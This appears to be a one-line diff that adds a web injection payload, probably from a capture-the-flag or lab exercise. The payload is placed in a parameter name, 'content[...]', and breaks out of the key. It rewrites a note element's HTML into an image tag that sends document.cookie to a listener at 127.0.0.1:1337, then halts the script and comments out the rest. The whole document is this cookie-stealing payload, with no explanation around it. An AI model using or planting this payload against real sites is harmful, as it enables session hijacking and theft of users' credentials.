@@ -1,0 +1,1 @@
+content[;document.getElementById('note-content').innerHTML='<img src=http://127.0.0.1:1337?c='%2bdocument.cookie%2b'>';exit();//]=pwnd
